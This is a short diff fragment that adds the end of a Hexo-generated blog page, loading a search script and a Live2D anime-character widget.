+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right"},"mobile":{"show":true}});</script></body>
+</html>
